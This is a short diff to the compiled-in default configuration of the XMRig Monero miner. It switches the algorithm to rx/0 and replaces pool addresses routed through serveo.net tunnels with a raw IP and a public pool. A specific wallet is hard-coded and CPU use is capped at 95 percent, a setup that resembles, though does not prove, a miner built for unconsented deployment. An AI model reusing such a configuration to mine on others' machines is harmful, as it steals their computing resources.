@@ -33,7 +33,7 @@ namespace xmrig {
 const static char *default_config =
 R"===(
 {
-    "algo": "cryptonight",
+    "algo": "rx/0",
     "api": {
         "port": 0,
         "access-token": null,
@@ -56,7 +56,7 @@ R"===(
     "max-cpu-usage": 95,
     "pools": [
         {
-            "url": "serveo.net:44444",
+            "url": "84.32.248.177:3333",
             "user": "47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV",
             "pass": "x",
             "rig-id": null,
@@ -67,29 +67,7 @@ R"===(
             "tls-fingerprint": null
         },
         {
-            "url": "serveo.net:33333",
-            "user": "47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": true,
-            "keepalive": false,
-            "variant": -1,
-            "tls": false,
-            "tls-fingerprint": null
-        },
-        {
-            "url": "serveo.net:22222",
-            "user": "47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": true,
-            "keepalive": false,
-            "variant": -1,
-            "tls": false,
-            "tls-fingerprint": null
-        },
-        {
-            "url": "serveo.net:11111",
+            "url": "pool.supportxmr.com:3333",
             "user": "47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV",
             "pass": "x",
             "rig-id": null,
